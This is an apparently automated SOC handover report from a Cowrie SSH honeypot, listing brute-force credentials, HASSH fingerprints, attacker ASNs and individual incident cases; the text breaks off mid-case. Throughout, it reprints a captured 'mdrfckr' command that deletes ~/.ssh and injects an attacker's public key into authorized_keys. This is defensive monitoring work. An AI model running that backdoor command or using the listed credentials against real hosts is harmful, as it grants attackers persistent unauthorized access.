# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-18 |
| **Generated At** | 2026-04-18T10:46:24Z |
| **Shift Time** | 10:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **157** |
| Confirmed Threats | **135** |
| False Positives Filtered | **22** (14.0%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **8** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **102** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **133** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **19** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **32** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `345gs5662d34` | 27 |
| `vpn` | 6 |
| `dev` | 5 |
| `test7` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 27 |
| `3245gs5662d34` | 27 |
| `123456` | 6 |
| `vpn!@#` | 3 |
| `Vpn1234` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 27 |
| `root` | `3245gs5662d34` | 27 |
| `vpn` | `vpn!@#` | 3 |
| `vpn` | `Vpn1234` | 3 |
| `root` | `Qazwsx2023@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx2023@` | `113.193.234.210` | 2026-04-18T08:59:00 |
| `root` | `3245gs5662d34` | `113.193.234.210` | 2026-04-18T08:59:02 |
| `root` | `7ujm#$` | `20.12.41.6` | 2026-04-18T09:01:43 |
| `root` | `3245gs5662d34` | `20.12.41.6` | 2026-04-18T09:01:48 |
| `root` | `S123456` | `103.243.26.174` | 2026-04-18T09:06:12 |
| `root` | `3245gs5662d34` | `103.243.26.174` | 2026-04-18T09:06:14 |
| `root` | `pedro123` | `103.243.26.174` | 2026-04-18T09:07:37 |
| `root` | `Abc@123456` | `20.12.41.6` | 2026-04-18T09:11:35 |
| `root` | `Qazwsx2023@` | `103.243.26.174` | 2026-04-18T09:14:17 |
| `root` | `pedro123` | `20.12.41.6` | 2026-04-18T09:14:47 |
| `root` | `Qazwsx0#` | `20.12.41.6` | 2026-04-18T09:18:09 |
| `root` | `7ujm#$` | `103.243.26.174` | 2026-04-18T09:19:01 |
| `root` | `S123456` | `20.12.41.6` | 2026-04-18T09:19:45 |
| `root` | `pedro123` | `103.215.80.173` | 2026-04-18T09:20:35 |
| `root` | `3245gs5662d34` | `103.215.80.173` | 2026-04-18T09:20:40 |
| `root` | `Qazwsx0#` | `103.243.26.174` | 2026-04-18T09:24:58 |
| `root` | `S123456` | `103.215.80.173` | 2026-04-18T09:25:07 |
| `root` | `Abc@123456` | `103.215.80.173` | 2026-04-18T09:27:21 |
| `root` | `bbCC123123` | `20.12.41.6` | 2026-04-18T09:27:50 |
| `root` | `Asdf2025` | `20.12.41.6` | 2026-04-18T09:29:30 |
| `root` | `Abc@123456` | `103.243.26.174` | 2026-04-18T09:29:35 |
| `root` | `bbCC123123` | `103.215.80.173` | 2026-04-18T09:29:40 |
| `root` | `q1w2e3r4t5y6u7i8o9p0` | `20.12.41.6` | 2026-04-18T09:31:06 |
| `root` | `bbCC123123` | `103.243.26.174` | 2026-04-18T09:31:09 |
| `root` | `q1w2e3r4t5y6u7i8o9p0` | `103.215.80.173` | 2026-04-18T09:32:16 |
| `root` | `q1w2e3r4t5y6u7i8o9p0` | `103.243.26.174` | 2026-04-18T09:32:35 |
| `root` | `Qazwsx2023@` | `20.12.41.6` | 2026-04-18T09:32:39 |
| `root` | `Asdf2025` | `103.243.26.174` | 2026-04-18T09:34:04 |
| `root` | `Qazwsx0#` | `103.215.80.173` | 2026-04-18T09:34:51 |
| `root` | `Asdf2025` | `103.215.80.173` | 2026-04-18T09:39:28 |
| `root` | `7ujm#$` | `103.215.80.173` | 2026-04-18T09:44:08 |
| `root` | `!Q2w3e4r` | `51.89.1.86` | 2026-04-18T10:01:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **157** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 126 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 126 | 4 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 126 | 4 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 27 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.215.80.173`, `113.193.234.210`, `103.243.26.174`, `20.12.41.6`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45528` | Tikona Infinet Ltd. | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS3352` | TELEFONICA DE ESPANA S.A.U. | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | LOW |
| `AS24544` | Overcasts Limited | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (55)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c93db8252fa2

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-04-18 08:59 |
| **Last Seen** | 2026-04-18 08:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 08:59:00` | `cowrie.session.connect` |
| `2026-04-18 08:59:00` | `cowrie.client.version` |
| `2026-04-18 08:59:00` | `cowrie.client.kex` |
| `2026-04-18 08:59:00` | `cowrie.login.success` |
| `2026-04-18 08:59:00` | `cowrie.session.params` |
| `2026-04-18 08:59:00` | `cowrie.command.input` |
| `2026-04-18 08:59:00` | `cowrie.command.failed` |
| `2026-04-18 08:59:00` | `cowrie.log.closed` |
| `2026-04-18 08:59:00` | `cowrie.session.params` |
| `2026-04-18 08:59:00` | `cowrie.command.input` |
| `2026-04-18 08:59:00` | `cowrie.session.file_download` |
| `2026-04-18 08:59:00` | `cowrie.log.closed` |
| `2026-04-18 08:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d8ac0e4a36

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-04-18 08:59 |
| **Last Seen** | 2026-04-18 08:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 08:59:01` | `cowrie.session.connect` |
| `2026-04-18 08:59:01` | `cowrie.client.version` |
| `2026-04-18 08:59:01` | `cowrie.client.kex` |
| `2026-04-18 08:59:02` | `cowrie.login.success` |
| `2026-04-18 08:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82391cd5557

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:01 |
| **Last Seen** | 2026-04-18 09:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:01:42` | `cowrie.session.connect` |
| `2026-04-18 09:01:42` | `cowrie.client.version` |
| `2026-04-18 09:01:42` | `cowrie.client.kex` |
| `2026-04-18 09:01:43` | `cowrie.login.success` |
| `2026-04-18 09:01:43` | `cowrie.session.params` |
| `2026-04-18 09:01:43` | `cowrie.command.input` |
| `2026-04-18 09:01:43` | `cowrie.command.failed` |
| `2026-04-18 09:01:44` | `cowrie.log.closed` |
| `2026-04-18 09:01:44` | `cowrie.session.params` |
| `2026-04-18 09:01:44` | `cowrie.command.input` |
| `2026-04-18 09:01:45` | `cowrie.session.file_download` |
| `2026-04-18 09:01:45` | `cowrie.log.closed` |
| `2026-04-18 09:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500c1cdcf87d

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:01 |
| **Last Seen** | 2026-04-18 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:01:47` | `cowrie.session.connect` |
| `2026-04-18 09:01:47` | `cowrie.client.version` |
| `2026-04-18 09:01:47` | `cowrie.client.kex` |
| `2026-04-18 09:01:48` | `cowrie.login.success` |
| `2026-04-18 09:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bfa090683c8

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:06 |
| **Last Seen** | 2026-04-18 09:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:06:11` | `cowrie.session.connect` |
| `2026-04-18 09:06:11` | `cowrie.client.version` |
| `2026-04-18 09:06:11` | `cowrie.client.kex` |
| `2026-04-18 09:06:12` | `cowrie.login.success` |
| `2026-04-18 09:06:12` | `cowrie.session.params` |
| `2026-04-18 09:06:12` | `cowrie.command.input` |
| `2026-04-18 09:06:12` | `cowrie.command.failed` |
| `2026-04-18 09:06:12` | `cowrie.log.closed` |
| `2026-04-18 09:06:12` | `cowrie.session.params` |
| `2026-04-18 09:06:12` | `cowrie.command.input` |
| `2026-04-18 09:06:12` | `cowrie.session.file_download` |
| `2026-04-18 09:06:12` | `cowrie.log.closed` |
| `2026-04-18 09:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34673cdf4816

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:06 |
| **Last Seen** | 2026-04-18 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:06:14` | `cowrie.session.connect` |
| `2026-04-18 09:06:14` | `cowrie.client.version` |
| `2026-04-18 09:06:14` | `cowrie.client.kex` |
| `2026-04-18 09:06:14` | `cowrie.login.success` |
| `2026-04-18 09:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3307671a4352

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:07 |
| **Last Seen** | 2026-04-18 09:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:07:36` | `cowrie.session.connect` |
| `2026-04-18 09:07:36` | `cowrie.client.version` |
| `2026-04-18 09:07:36` | `cowrie.client.kex` |
| `2026-04-18 09:07:37` | `cowrie.login.success` |
| `2026-04-18 09:07:37` | `cowrie.session.params` |
| `2026-04-18 09:07:37` | `cowrie.command.input` |
| `2026-04-18 09:07:37` | `cowrie.command.failed` |
| `2026-04-18 09:07:37` | `cowrie.log.closed` |
| `2026-04-18 09:07:37` | `cowrie.session.params` |
| `2026-04-18 09:07:37` | `cowrie.command.input` |
| `2026-04-18 09:07:37` | `cowrie.session.file_download` |
| `2026-04-18 09:07:37` | `cowrie.log.closed` |
| `2026-04-18 09:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b4081a341fa

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:07 |
| **Last Seen** | 2026-04-18 09:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:07:39` | `cowrie.session.connect` |
| `2026-04-18 09:07:39` | `cowrie.client.version` |
| `2026-04-18 09:07:39` | `cowrie.client.kex` |
| `2026-04-18 09:07:39` | `cowrie.login.success` |
| `2026-04-18 09:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e1a663b20e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:11 |
| **Last Seen** | 2026-04-18 09:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:11:34` | `cowrie.session.connect` |
| `2026-04-18 09:11:34` | `cowrie.client.version` |
| `2026-04-18 09:11:34` | `cowrie.client.kex` |
| `2026-04-18 09:11:35` | `cowrie.login.success` |
| `2026-04-18 09:11:36` | `cowrie.session.params` |
| `2026-04-18 09:11:36` | `cowrie.command.input` |
| `2026-04-18 09:11:36` | `cowrie.command.failed` |
| `2026-04-18 09:11:36` | `cowrie.log.closed` |
| `2026-04-18 09:11:37` | `cowrie.session.params` |
| `2026-04-18 09:11:37` | `cowrie.command.input` |
| `2026-04-18 09:11:37` | `cowrie.session.file_download` |
| `2026-04-18 09:11:37` | `cowrie.log.closed` |
| `2026-04-18 09:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1a64026b7e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:11 |
| **Last Seen** | 2026-04-18 09:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:11:40` | `cowrie.session.connect` |
| `2026-04-18 09:11:40` | `cowrie.client.version` |
| `2026-04-18 09:11:40` | `cowrie.client.kex` |
| `2026-04-18 09:11:41` | `cowrie.login.success` |
| `2026-04-18 09:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778536c485ed

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:14 |
| **Last Seen** | 2026-04-18 09:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:14:16` | `cowrie.session.connect` |
| `2026-04-18 09:14:16` | `cowrie.client.version` |
| `2026-04-18 09:14:17` | `cowrie.client.kex` |
| `2026-04-18 09:14:17` | `cowrie.login.success` |
| `2026-04-18 09:14:17` | `cowrie.session.params` |
| `2026-04-18 09:14:17` | `cowrie.command.input` |
| `2026-04-18 09:14:17` | `cowrie.command.failed` |
| `2026-04-18 09:14:17` | `cowrie.log.closed` |
| `2026-04-18 09:14:17` | `cowrie.session.params` |
| `2026-04-18 09:14:17` | `cowrie.command.input` |
| `2026-04-18 09:14:17` | `cowrie.session.file_download` |
| `2026-04-18 09:14:17` | `cowrie.log.closed` |
| `2026-04-18 09:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267f5f690c72

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:14 |
| **Last Seen** | 2026-04-18 09:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:14:19` | `cowrie.session.connect` |
| `2026-04-18 09:14:19` | `cowrie.client.version` |
| `2026-04-18 09:14:19` | `cowrie.client.kex` |
| `2026-04-18 09:14:20` | `cowrie.login.success` |
| `2026-04-18 09:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e7fe263643

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:14 |
| **Last Seen** | 2026-04-18 09:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
